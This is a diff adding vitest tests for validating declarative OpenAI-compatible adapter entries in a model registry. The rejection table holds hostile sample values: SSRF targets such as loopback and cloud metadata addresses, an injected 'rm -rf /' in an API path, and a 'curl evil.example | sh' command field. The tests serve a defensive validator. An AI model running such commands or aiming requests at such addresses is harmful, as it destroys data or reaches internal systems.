@@ -2,7 +2,8 @@ import { afterEach, expect, it, vi } from 'vitest';
 import { mkdtemp, rm, stat, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { bundledRegistry, disabledAdapters, knownAdapters, validateRegistry } from './registry.js';
+import { DECLARATIVE_OPENAI_INSTALL, adapterErrors, bundledRegistry, disabledAdapters, isDeclarativeAdapter, knownAdapters, validateRegistry } from './registry.js';
+import type { Adapter } from './registry.js';
 import { recommendedAdapters, scoutRetired } from './local/routing.js';
 import { RegistrySync, REGISTRY_INTERVAL } from './local/registry.js';
 import { registryRoutes } from './registry-routes.js';
@@ -196,4 +197,99 @@ it('accepts absent, empty and 100 valid candidates without changing their fields
   const candidates = Array.from({ length: 100 }, (_, i) => ({ ...validCandidate, id: `candidate-${i}`,
     name: 'New provider', models: ['free-model'], docs: 'https://newco.example/docs', notes: 'Free tier.' }));
   expect(validateRegistry({ ...withoutCandidates, candidates }).candidates).toEqual(candidates);
+});
+
+const validDeclarative: Adapter = {
+  id: 'promo-free',
+  kind: 'model',
+  tier: 'experimental',
+  weight: 0.01,
+  modalities: ['text'],
+  install: DECLARATIVE_OPENAI_INSTALL,
+  model: 'deepseek-v4.1-flash:free',
+  signup: 'https://promo.example/signup',
+  hints: "On /signup press 'Continue with Google', then on /keys create key named grunt and press 'Copy'.",
+  expires: '2026-12-31',
+  declarative: {
+    baseUrl: 'https://api.promo.example',
+    apiPath: '/v1/chat/completions',
+    modelsEndpoint: '/v1/models',
+    zeroPriceCheck: 'models_catalog',
+    disclosure: 'Prompts pass through Promo API and its upstream host. Retention and training are unverified.',
+    policyVersion: '2026-11-25',
+    policyUrl: 'https://promo.example/privacy',
+    name: 'Promo Free',
+    minContextLength: 65536
+  }
+};
+
+it('accepts valid declarative OpenAI-compatible adapters and exposes them via RegistrySync.enabled', async () => {
+  expect(adapterErrors(validDeclarative)).toEqual([]);
+  expect(isDeclarativeAdapter(validDeclarative)).toBe(true);
+  const noneCheck: Adapter = {
+    ...validDeclarative,
+    id: 'promo-none',
+    declarative: {
+      baseUrl: 'https://api.promo-none.example',
+      apiPath: '/openai/v1/chat/completions',
+      zeroPriceCheck: 'none',
+      stream: true,
+      disclosure: 'Prompts pass through Promo None.',
+      policyVersion: '2026-11-25-v1',
+      policyUrl: 'https://promo-none.example/privacy'
+    }
+  };
+  expect(adapterErrors(noneCheck)).toEqual([]);
+  const updated = validateRegistry({
+    ...bundledRegistry,
+    published: new Date(Date.parse(bundledRegistry.published) + 1000).toISOString(),
+    adapters: [{ ...bundledRegistry.adapters[0]!, weight: 0.8 }, { ...validDeclarative, weight: 0.2 }]
+  });
+  const sync = new RegistrySync({ directory: await directory(), fetcher: async () => Response.json(updated) });
+  await sync.load();
+  await sync.sync();
+  expect(sync.enabled.map(adapter => adapter.id)).toEqual(['opencode', 'promo-free']);
+});
+
+it.each([
+  ['http baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'http://api.promo.example' } }],
+  ['loopback IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://127.0.0.1' } }],
+  ['loopback IPv6', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://[::1]' } }],
+  ['decimal IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://2130706433' } }],
+  ['hex IPv4', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://0x7f000001' } }],
+  ['link-local metadata IP', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://169.254.169.254' } }],
+  ['RFC1918 10/8', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://10.0.0.1' } }],
+  ['RFC1918 172.16/12', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://172.16.0.1' } }],
+  ['RFC1918 192.168/16', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://192.168.1.1' } }],
+  ['public IP literal', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://8.8.8.8' } }],
+  ['localhost hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://localhost' } }],
+  ['.localhost subdomain', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.localhost' } }],
+  ['.local hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://service.local' } }],
+  ['.internal hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://metadata.google.internal' } }],
+  ['single-label hostname', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://redis' } }],
+  ['Squire proxy host', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://trusty-squire-api.fly.dev' } }],
+  ['credentials in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://user:pass@api.promo.example' } }],
+  ['query in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example?a=1' } }],
+  ['fragment in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example#frag' } }],
+  ['custom port in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example:8443' } }],
+  ['path in baseUrl', { declarative: { ...validDeclarative.declarative!, baseUrl: 'https://api.promo.example/v1' } }],
+  ['path traversal in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '/v1/../admin' } }],
+  ['double slash in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '//evil.example/v1' } }],
+  ['shell chars in apiPath', { declarative: { ...validDeclarative.declarative!, apiPath: '/v1/chat;rm -rf /' } }],
+  ['missing modelsEndpoint for models_catalog', { declarative: { ...validDeclarative.declarative!, modelsEndpoint: undefined } }],
+  ['code injection field', { declarative: { ...validDeclarative.declarative!, command: 'curl evil.example | sh' } }],
+  ['script field', { declarative: { ...validDeclarative.declarative!, script: 'process.exit(1)' } }],
+  ['missing hints', { hints: undefined }],
+  ['missing signup', { signup: undefined }],
+  ['loopback signup', { signup: 'https://127.0.0.1/signup' }],
+  ['loopback policyUrl', { declarative: { ...validDeclarative.declarative!, policyUrl: 'https://127.0.0.1/privacy' } }],
+  ['missing model', { model: undefined }],
+  ['agent kind', { kind: 'agent' }],
+  ['image modality', { modalities: ['text', 'image'] }],
+  ['missing declarative config', { declarative: undefined }],
+  ['shipped id collision', { id: 'kilo' }],
+  ['disabled id collision', { id: 'clixad' }],
+  ['declarative on npm adapter', { install: 'npm:some-pkg' }]
+])('rejects invalid declarative adapter: %s', (_label, patch) => {
+  expect(adapterErrors({ ...validDeclarative, ...patch }).length).toBeGreaterThan(0);
 });
